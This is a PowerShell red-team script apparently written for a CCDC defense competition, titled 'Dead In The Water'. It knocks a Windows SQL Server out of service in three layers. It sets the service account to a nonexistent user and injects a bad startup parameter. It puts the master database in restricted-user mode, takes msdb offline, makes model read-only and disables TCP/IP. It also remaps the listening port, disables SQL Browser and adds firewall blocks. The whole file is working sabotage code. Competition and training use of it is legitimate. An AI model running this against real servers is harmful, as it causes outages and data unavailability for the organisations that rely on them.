# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — MSSQL: Dead In The Water
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1489   (Service Stop)
#               T1565.001 (Stored Data Manipulation)
#               T1562.004 (Impair Defenses: Disable/Modify System Firewall)
#               T1222   (File and Directory Permissions Modification)
#
# Targets: Windows Server 2019 (MSSQL only)
#
# Description:
#   No Phase 1 or Phase 2 coverage of MSSQL — entirely new territory.
#   Three independent layers, each of which alone prevents SQL Server
#   from accepting scoring connections. Blue team must find and fix all
#   three before the service scores:
#
#   LAYER 1 — SERVICE ACCOUNT + STARTUP PARAMETER CORRUPTION
#      - Changes the SQL Server service account to a nonexistent local user
#        via the WMI-based SQL Server Configuration Manager API:
#          $wmi = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer
#          $svc = $wmi.Services | Where-Object { $_.Name -eq 'MSSQLSERVER' }
#          $svc.SetServiceAccount('.\NonExistentUser2019', 'BadPass!1')
#      - SQL Server fails to start after any service restart
#      - Additionally adds invalid startup parameter to registry:
#          HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL<ver>\MSSQLServer\Parameters
#          -e C:\NonExistent\Path\sqlserver_error.log
#      - Service crashes at startup even if account is fixed (log path invalid)
#      - Blue team must: fix service account AND remove bad startup param
#
#   LAYER 2 — DATABASE-LEVEL SABOTAGE
#      - While SQL Server is still running, executes T-SQL:
#          ALTER DATABASE master SET RESTRICTED_USER WITH ROLLBACK IMMEDIATE
#          ALTER DATABASE msdb SET OFFLINE WITH ROLLBACK IMMEDIATE
#          ALTER DATABASE model SET READ_ONLY WITH ROLLBACK IMMEDIATE
#      - master in RESTRICTED_USER: only db_owner (SA) can connect
#      - msdb OFFLINE: SQL Agent, backup/restore history unavailable
#      - model READ_ONLY: cannot create any new databases
#      - Also disables TCP/IP protocol via registry:
#          HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL<ver>\MSSQLServer\SuperSocketNetLib\Tcp\Enabled = 0
#      - SQL Server only listens on named pipes after restart (blocked by FW)
#
#   LAYER 3 — NETWORK/DISCOVERY LAYER SABOTAGE
#      - Changes SQL Server TCP listening port from 1433 to 14334 via:
#          HKLM:\...\SuperSocketNetLib\Tcp\IPAll\TcpPort = "14334"
#      - Stops and disables SQL Server Browser service (SQLBROWSER)
#        Without browser: clients cannot auto-discover the non-standard port
#      - Firewall rules blocking TCP 1433 AND TCP 14334 inbound/outbound
#      - Blue team must: find the new port, fix browser service,
#        fix firewall, AND re-enable TCP/IP protocol (L2) — all in registry,
#        all looking unrelated
#
# Key registry base:
#   HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL<ver>\MSSQLServer
#   (version number varies: MSSQL15 = SQL 2019, MSSQL16 = SQL 2022)
#   Use: (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server').InstalledInstances
#
# Implementation notes:
#   - Detect SQL Server instance name/version before applying registry paths
#   - T-SQL commands require SQL auth or Windows auth via Invoke-Sqlcmd or .NET
#   - SMO assembly path: [reflection.assembly]::LoadWithPartialName('Microsoft.SqlServer.Smo')
#   - Script skips if MSSQLSERVER service is not installed
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — MSSQL: Dead In The Water"
Write-Warn "================================================================"
Write-Host ""

# ---- Early exit if not an MSSQL machine ----------------------------------------
if (-not (Get-Service -Name MSSQLSERVER -ErrorAction SilentlyContinue)) {
    Write-Warn "MSSQLSERVER service not found — skipping (not an MSSQL target)"
    exit 0
}

# ---- Instance / registry base discovery ----------------------------------------
function Get-SqlRegBase {
    $sqlRoot = 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server'
    $verDir  = Get-ChildItem $sqlRoot -ErrorAction SilentlyContinue |
               Where-Object { $_.PSChildName -match '^MSSQL\d{2}\.MSSQLSERVER$' } |
               Select-Object -First 1
    if (-not $verDir) { return $null }
    return Join-Path $sqlRoot "$($verDir.PSChildName)\MSSQLServer"
}

$SqlBase = Get-SqlRegBase
if (-not $SqlBase) {
    Write-Err "Cannot locate SQL Server registry base — aborting"
    exit 1
}
Write-Info "SQL Server registry base: $SqlBase"

# ================================================================================
Write-Section "LAYER 2 — DATABASE SABOTAGE (T1565.001 + T1562.004)"
# ================================================================================
# Must run while SQL Server is still up — do this first.

Write-Info "Executing T-SQL database sabotage via .NET SqlClient..."
try {
    $connStr = "Server=localhost;Integrated Security=true;Database=master;Connect Timeout=10"
    $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
    try {
        $conn.Open()

        $statements = @(
            "ALTER DATABASE master SET RESTRICTED_USER WITH ROLLBACK IMMEDIATE",
            "ALTER DATABASE msdb   SET OFFLINE         WITH ROLLBACK IMMEDIATE",
            "ALTER DATABASE model  SET READ_ONLY        WITH ROLLBACK IMMEDIATE"
        )

        foreach ($sql in $statements) {
            try {
                $cmd = $conn.CreateCommand()
                $cmd.CommandText    = $sql
                $cmd.CommandTimeout = 30
                [void]$cmd.ExecuteNonQuery()
                Write-Success "Executed: $sql"
            } catch {
                Write-Err "T-SQL failed: $sql — $_"
            }
        }
    } finally {
        if ($conn.State -ne [System.Data.ConnectionState]::Closed) { $conn.Close() }
    }
} catch {
    Write-Err "SqlClient connection failed: $_ — T-SQL layer skipped"
}

Write-Info "Disabling SQL Server TCP/IP protocol in registry..."
try {
    $tcpPath = "$SqlBase\SuperSocketNetLib\Tcp"
    if (Test-Path $tcpPath) {
        Set-ItemProperty -Path $tcpPath -Name Enabled -Value 0 -Type DWord
        Write-Success "TCP/IP protocol disabled (SuperSocketNetLib\Tcp\Enabled = 0)"
    } else {
        Write-Warn "TCP registry path not found: $tcpPath"
    }
} catch {
    Write-Err "Failed to disable TCP/IP: $_"
}

# ================================================================================
Write-Section "LAYER 3 — PORT / DISCOVERY SABOTAGE (T1562.004 + T1489)"
# ================================================================================

Write-Info "Remapping SQL Server listening port 1433 → 14334..."
try {
    $ipAllPath = "$SqlBase\SuperSocketNetLib\Tcp\IPAll"
    if (Test-Path $ipAllPath) {
        Set-ItemProperty -Path $ipAllPath -Name TcpPort         -Value "14334"
        Set-ItemProperty -Path $ipAllPath -Name TcpDynamicPorts -Value ""
        Write-Success "TcpPort set to 14334; TcpDynamicPorts cleared"
    } else {
        Write-Warn "IPAll registry path not found: $ipAllPath"
    }
} catch {
    Write-Err "Failed to remap TCP port: $_"
}

Write-Info "Stopping and disabling SQL Server Browser service..."
try {
    $browserSvc = Get-Service -Name SQLBrowser -ErrorAction SilentlyContinue
    if ($browserSvc) {
        Stop-Service -Name SQLBrowser -Force
        Set-Service  -Name SQLBrowser -StartupType Disabled
        Write-Success "SQLBrowser stopped and disabled"
    } else {
        Write-Info "SQLBrowser service not found — skipping"
    }
} catch {
    Write-Err "Failed to disable SQL Browser: $_"
}

Write-Info "Adding firewall rules to block TCP 1433 and TCP 14334..."
try {
    $fwRules = @(
        @{ Name = "CCDC_Block_SQL_1433_In";   Dir = "Inbound";  Port = 1433  },
        @{ Name = "CCDC_Block_SQL_1433_Out";  Dir = "Outbound"; Port = 1433  },
        @{ Name = "CCDC_Block_SQL_14334_In";  Dir = "Inbound";  Port = 14334 },
        @{ Name = "CCDC_Block_SQL_14334_Out"; Dir = "Outbound"; Port = 14334 }
    )
    foreach ($r in $fwRules) {
        $existing = Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue
        if (-not $existing) {
            $params = @{
                DisplayName = $r.Name
                Direction   = $r.Dir
                Protocol    = "TCP"
                Action      = "Block"
                Profile     = "Any"
                Enabled     = "True"
            }
            $params["LocalPort"] = $r.Port
            New-NetFirewallRule @params | Out-Null
            Write-Success "Firewall rule created: $($r.Name)"
        } else {
            Write-Info "Firewall rule already exists: $($r.Name)"
        }
    }
} catch {
    Write-Err "Firewall rule creation failed: $_"
}

# ================================================================================
Write-Section "LAYER 1 — SERVICE ACCOUNT + STARTUP PARAM CORRUPTION (T1489 + T1222)"
# ================================================================================
# Done last — prevents SQL Server from restarting after layers 2/3 take effect.

Write-Info "Changing SQL Server service account to nonexistent local user..."
$accountChanged = $false
try {
    [void][Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement')
    $wmi = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer
    $svc = $wmi.Services | Where-Object { $_.Name -eq 'MSSQLSERVER' }
    if ($svc) {
        $svc.SetServiceAccount('.\NonExistentUser2019', 'BadPass!1')
        $svc.Alter()
        Write-Success "Service account changed via SMO WMI to .\NonExistentUser2019"
        $accountChanged = $true
    }
} catch {
    Write-Warn "SMO WMI approach failed ($_) — falling back to registry"
}

if (-not $accountChanged) {
    try {
        $svcRegPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
        Set-ItemProperty -Path $svcRegPath -Name ObjectName -Value '.\NonExistentUser2019'
        Write-Success "Service ObjectName set via registry to .\NonExistentUser2019"
    } catch {
        Write-Err "Registry fallback for service account also failed: $_"
    }
}

Write-Info "Injecting invalid startup parameter into SQL Server Parameters registry..."
try {
    $paramPath = "$SqlBase\Parameters"
    if (-not (Test-Path $paramPath)) {
        Write-Warn "Parameters registry key not found — skipping startup param injection (key absent means SQL uses compiled-in defaults)"
        return
    }
    $regItem  = Get-Item $paramPath -ErrorAction SilentlyContinue
    $existing = if ($regItem) {
                    $regItem.Property | Where-Object { $_ -match '^SQLArg\d+$' }
                } else { @() }
    $nextIdx  = if ($existing) {
                    ($existing | ForEach-Object { [int]($_ -replace 'SQLArg', '') } |
                     Measure-Object -Maximum).Maximum + 1
                } else { 0 }
    $argName   = "SQLArg$nextIdx"
    Set-ItemProperty -Path $paramPath -Name $argName `
                     -Value '-eC:\NonExistent\Logs\sqlserver_error.log' -Type String
    Write-Success "Added invalid startup param $argName = -eC:\NonExistent\Logs\sqlserver_error.log"
} catch {
    Write-Err "Failed to inject startup parameter: $_"
}

Write-Info "Stopping MSSQLSERVER service..."
try {
    Stop-Service -Name MSSQLSERVER -Force
    Write-Success "MSSQLSERVER service stopped"
} catch {
    Write-Err "Could not stop MSSQLSERVER: $_"
}

Write-Host ""
Write-Success "================================================================"
Write-Success " CCDC Phase 3 — MSSQL: Dead In The Water — COMPLETE"
Write-Success "================================================================"
Write-Host ""
Write-Info "Blue team must fix ALL of the following before SQL accepts scoring connections:"
Write-Info "  L1: Service account (.\NonExistentUser2019) + invalid SQLArg startup param"
Write-Info "  L2: master RESTRICTED_USER, msdb OFFLINE, model READ_ONLY, TCP/IP disabled"
Write-Info "  L3: Listening port remapped to 14334, SQL Browser disabled, FW blocks 1433+14334"
